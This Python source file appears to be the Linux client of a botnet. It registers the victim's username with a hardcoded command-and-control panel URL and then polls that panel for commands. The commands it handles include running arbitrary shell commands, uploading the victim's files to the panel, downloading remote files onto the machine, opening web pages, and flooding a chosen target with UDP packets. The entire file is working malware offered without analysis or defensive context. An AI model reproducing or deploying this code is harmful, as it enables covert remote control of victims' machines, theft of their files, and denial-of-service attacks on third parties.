import requests
import os
import socket
import base64
import time
import string
import webbrowser

PanelURL = "https://blackpsycho511.000webhostapp.com/blacknet/"
cid = "Hacked"
username = os.getenv("USER")
Y = "|BN|"
uid = cid + "_" + "Random"
cp_name = "None"
oss = "GNU/LINUX"
cdata = uid + Y + username  + Y + oss + Y + "Unknown" + Y + "Online" + Y + "no" + Y + "no"

try:
    requests.get(url=PanelURL + "connection.php",
                 params={'data': base64.urlsafe_b64encode(cdata.encode('UTF-8')).decode('ascii') })
except:
    print("Connection Error")

def Send(command, vic_id):
    requests.get(url=PanelURL + "receive.php",
             params={'command': base64.b64encode(command), 'vicID': base64.b64encode(vic_id)})
    pass


def Upload(filepath):
    url = PanelURL + "upload.php"
    files = {'file': open(filepath, 'rb')}
    requests.post(url, files=files)
    pass


count = 1
while count == 1:
    commands = requests.get(PanelURL + "/getCommand.php?id=" + uid)
    split_command = base64.b64decode(commands.text).split(Y)

    if split_command[0] == '':
        print("")
    else:
        if split_command[0] == "PrintMessage":
            print(split_command[1])
            Send("CleanCommands", uid)

        if split_command[0] == "OpenPage":
            webbrowser.open(split_command[1])
            Send("CleanCommands", uid)

        if split_command[0] == "DDOSAttack":
            port = 80
            sent = 0
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            flood = os
            while split_command[1] == "Enable":
                sock.sendto(flood.urandom(1490), (split_command[2], port))
                sent = sent + 1
                port = port + 1
                if port == 65534:
                    port = 1

        if split_command[0] == "UploadFile":
            file_url = split_command[1]
            r = requests.get(file_url, stream=True)
            with open(split_command[2], "wb") as new_file:
                for chunk in r.iter_content(chunk_size=1024):
                    if chunk:
                        new_file.write(chunk)
                    pass
                Send("CleanCommands", uid)

        if split_command[0] == "Uninstall":
            Send("Uninstall", uid)
            quit()

        if split_command[0] == "Close":
            Send("Offline", uid)
            quit()

        if split_command[0] == "Execute":
            os.system(split_command[1])
            Send("CleanCommands", uid)

        if split_command[0] == "Upload":
            Upload(split_command[1])
            Send("CleanCommands", uid)
pass
